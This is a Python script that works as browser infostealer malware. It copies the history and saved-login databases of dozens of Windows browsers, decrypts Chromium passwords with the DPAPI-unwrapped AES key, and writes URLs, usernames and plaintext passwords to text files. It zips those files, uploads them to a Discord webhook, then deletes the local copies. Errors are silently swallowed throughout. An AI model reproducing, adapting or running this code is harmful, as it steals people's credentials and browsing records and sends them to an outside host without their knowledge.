import os
import json
import base64
import sqlite3
import shutil
import requests
import zipfile
from Crypto.Cipher import AES
import win32crypt
def send_file_to_discord(file_path):
    with open(file_path, 'rb') as file:
        response = requests.post(
            webhook_url,
            files={'file': (os.path.basename(file_path), file)},
        )
        if response.status_code == 200:
            pass
        else:
            pass
def get_aes_key(browser_name):
    paths = {
        "Chrome": [
            os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"),
            os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Local State")
        ],
        "Edge": [
            os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State")
        ],
        "Brave": [
            os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State")
        ],
        "Firefox": [
            os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\prefs.js")
        ],
        "Opera": [
            os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data")
        ],
        "Vivaldi": [
            os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Default\\Local State")
        ],
        "Tor": [
            os.path.expanduser("~\\AppData\\Local\\Tor Browser\\Data\\Browser\\profile.default\\Secure Preferences")
        ],
        "Safari": [
            os.path.expanduser("~\\AppData\\Roaming\\Apple Computer\\Safari\\Login Data")
        ],
        "Yandex": [
            os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State")
        ],
        "Epic": [
            os.path.expanduser("~\\AppData\\Local\\Epic Privacy Browser\\User Data\\Local State")
        ],
        "Comodo Dragon": [
            os.path.expanduser("~\\AppData\\Local\\Comodo\\Dragon\\User Data\\Local State")
        ],
        # Additional 20 browsers added
        "SRWare Iron": [
            os.path.expanduser("~\\AppData\\Local\\SRWare Iron\\User Data\\Local State")
        ],
        "Maxthon": [
            os.path.expanduser("~\\AppData\\Local\\Maxthon\\User Data\\Local State")
        ],
        "Pale Moon": [
            os.path.expanduser("~\\AppData\\Roaming\\PaleMoon\\Profiles\\*\\prefs.js")
        ],
        "Comodo IceDragon": [
            os.path.expanduser("~\\AppData\\Roaming\\Comodo\\IceDragon\\Profiles\\*\\prefs.js")
        ],
        "UC Browser": [
            os.path.expanduser("~\\AppData\\Local\\UCWeb\\UCBrowser\\User Data\\Local State")
        ],
        "Slimjet": [
            os.path.expanduser("~\\AppData\\Local\\Slimjet\\User Data\\Local State")
        ],
        "Pale Moon": [
            os.path.expanduser("~\\AppData\\Roaming\\PaleMoon\\Profiles\\*\\prefs.js")
        ],
        "SeaMonkey": [
            os.path.expanduser("~\\AppData\\Roaming\\SeaMonkey\\Profiles\\*\\prefs.js")
        ],
        "Waterfox": [
            os.path.expanduser("~\\AppData\\Roaming\\Waterfox\\Profiles\\*\\prefs.js")
        ],
        "Midori": [
            os.path.expanduser("~\\AppData\\Local\\Midori\\User Data\\Local State")
        ],
        "QuteBrowser": [
            os.path.expanduser("~\\AppData\\Local\\QuteBrowser\\User Data\\Local State")
        ],
        "Basilisk": [
            os.path.expanduser("~\\AppData\\Roaming\\Basilisk\\Profiles\\*\\prefs.js")
        ],
        "Lunascape": [
            os.path.expanduser("~\\AppData\\Local\\Lunascape\\User Data\\Local State")
        ],
        "Waterfox": [
            os.path.expanduser("~\\AppData\\Roaming\\Waterfox\\Profiles\\*\\prefs.js")
        ],
        "Falkon": [
            os.path.expanduser("~\\AppData\\Local\\Falkon\\User Data\\Local State")
        ],
        "QuteBrowser": [
            os.path.expanduser("~\\AppData\\Local\\QuteBrowser\\User Data\\Local State")
        ],
        "Iron Browser": [
            os.path.expanduser("~\\AppData\\Local\\Iron Browser\\User Data\\Local State")
        ],
        "Avast Secure Browser": [
            os.path.expanduser("~\\AppData\\Local\\Avast Secure Browser\\User Data\\Local State")
        ],
    }
    for path in paths.get(browser_name, []):
        if os.path.exists(path):
            local_state_path = path
            break
    else:
        raise FileNotFoundError(f"Local State file not found for {browser_name}")
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
def decrypt_password_chrome_edge_brave(encrypted_password, aes_key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(aes_key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
        return decrypted_password
    except Exception as e:
        pass
        return None
def fetch_login_details(browser_paths):
    try:
        with open("Logins.txt", "w", encoding="utf-8") as f:
            f.write("=== COMBINED BROWSER LOGIN DETAILS ===\n\n")
        for browser_name, base_path in browser_paths.items():
            try:
                if browser_name in ["Chrome", "Edge", "Brave"]:
                    login_db_path = base_path.replace("History", "Login Data")
                    if not os.path.exists(login_db_path):
                        pass
                        continue
                    temp_path = f"temp_{browser_name.lower()}_logins.db"
                    shutil.copyfile(login_db_path, temp_path)
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    query = """
                    SELECT origin_url, username_value, password_value
                    FROM logins
                    """
                    cursor.execute(query)
                    aes_key = get_aes_key(browser_name)
                    with open("Logins.txt", "a", encoding="utf-8") as f:
                        f.write(f"=== {browser_name.upper()} LOGIN DETAILS ===\n\n")
                        for row in cursor.fetchall():
                            origin_url = row[0]
                            username = row[1]
                            encrypted_password = row[2]
                            password = decrypt_password_chrome_edge_brave(encrypted_password, aes_key)
                            f.write("=" * 80 + "\n")
                            f.write(f"Browser: {browser_name}\n")
                            f.write(f"Origin URL: {origin_url}\n")
                            f.write(f"Username: {username}\n")
                            f.write(f"Password: {password}\n")
                            f.write("=" * 80 + "\n\n")
                    conn.close()
                    os.remove(temp_path)
                elif browser_name == "Firefox":
                    pass
            except sqlite3.Error as e:
                pass
            except Exception as e:
                pass
    except Exception as e:
        pass
def fetch_browser_history():
    browser_paths = {
        "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"),
        "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"),
        "Firefox": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
        "Brave": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"),
        "Opera": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\History"),
        "Vivaldi": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Default\\History"),
        "Yahoo": os.path.expanduser("~\\AppData\\Local\\Yahoo\\Browser\\Default\\History"),
        "Yandex": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\History"),
        "Opera GX": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\History"),
        "Tor": os.path.expanduser("~\\AppData\\Local\\Tor Browser\\Data\\Browser\\profile.default"),
        "Epic": os.path.expanduser("~\\AppData\\Local\\Epic Privacy Browser\\User Data\\History"),
        "Comodo Dragon": os.path.expanduser("~\\AppData\\Local\\Comodo\\Dragon\\User Data\\History"),
        "Opera Neon": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera Neon\\User Data\\Default\\History"),
        "SRWare Iron": os.path.expanduser("~\\AppData\\Local\\SRWare Iron\\User Data\\History"),
        "Maxthon": os.path.expanduser("~\\AppData\\Local\\Maxthon\\User Data\\History"),
        "Pale Moon": os.path.expanduser("~\\AppData\\Roaming\\PaleMoon\\Profiles\\*\\places.sqlite"),
        "Comodo IceDragon": os.path.expanduser("~\\AppData\\Roaming\\Comodo\\IceDragon\\Profiles\\*\\places.sqlite"),
        "UC Browser": os.path.expanduser("~\\AppData\\Local\\UCWeb\\UCBrowser\\User Data\\History"),
        "Slimjet": os.path.expanduser("~\\AppData\\Local\\Slimjet\\User Data\\History"),
        "SeaMonkey": os.path.expanduser("~\\AppData\\Roaming\\SeaMonkey\\Profiles\\*\\places.sqlite"),
        "Waterfox": os.path.expanduser("~\\AppData\\Roaming\\Waterfox\\Profiles\\*\\places.sqlite"),
        "Midori": os.path.expanduser("~\\AppData\\Local\\Midori\\User Data\\History"),
        "QuteBrowser": os.path.expanduser("~\\AppData\\Local\\QuteBrowser\\User Data\\History"),
        "Basilisk": os.path.expanduser("~\\AppData\\Roaming\\Basilisk\\Profiles\\*\\places.sqlite"),
        "Lunascape": os.path.expanduser("~\\AppData\\Local\\Lunascape\\User Data\\History"),
        "Iron Browser": os.path.expanduser("~\\AppData\\Local\\Iron Browser\\User Data\\History"),
        "Avast Secure Browser": os.path.expanduser("~\\AppData\\Local\\Avast Secure Browser\\User Data\\History"),
    }
    try:
        with open("History.txt", "w", encoding="utf-8") as f:
            f.write("=== COMBINED BROWSER HISTORY ===\n\n")
        for browser_name, base_path in browser_paths.items():
            try:
                if browser_name == "Firefox":
                    if os.path.exists(base_path):
                        profiles = [f for f in os.listdir(base_path) if f.endswith('.default')]
                        if profiles:
                            base_path = os.path.join(base_path, profiles[0], 'places.sqlite')
                if not os.path.exists(base_path):
                    pass
                    continue
                temp_path = f"temp_{browser_name.lower()}_history.db"
                with open(base_path, 'rb') as src:
                    with open(temp_path, 'wb') as temp_file:
                        temp_file.write(src.read())
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                if browser_name == "Firefox":
                    query = """
                    SELECT url,
                           datetime(last_visit_date/1000000, 'unixepoch') AS last_visit,
                           visit_count
                    FROM moz_places
                    WHERE last_visit_date IS NOT NULL
                    ORDER BY last_visit_date DESC;
                    """
                else:
                    query = """
                    SELECT urls.url,
                           datetime(urls.last_visit_time / 1000000 - 11644473600, 'unixepoch') AS last_visit,
                           urls.visit_count
                    FROM urls
                    ORDER BY last_visit DESC;
                    """
                cursor.execute(query)
                with open("History.txt", "a", encoding="utf-8") as f:
                    f.write(f"=== {browser_name.upper()} HISTORY ===\n\n")
                    for row in cursor.fetchall():
                        url = row[0].replace("https://", "").replace("http://", "")
                        date = row[1]
                        visits = row[2]
                        f.write("=" * 80 + "\n")
                        f.write(f"Browser: {browser_name}\n")
                        f.write(f"URL: {url}\n")
                        f.write(f"Last Visited: {date}\n")
                        f.write(f"Visit Count: {visits}\n")
                        f.write("=" * 80 + "\n\n")
                conn.close()
                os.remove(temp_path)
            except sqlite3.Error as e:
                pass
            except Exception as e:
                pass

        fetch_login_details(browser_paths)
    except Exception as e:
        pass
def zip_files():
    with zipfile.ZipFile("Browsers.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
        zipf.write("Logins.txt")
        zipf.write("History.txt")
fetch_browser_history()
zip_files()
send_file_to_discord("Browsers.zip")
os.remove("Logins.txt")
os.remove("History.txt")
os.remove("Browsers.zip")
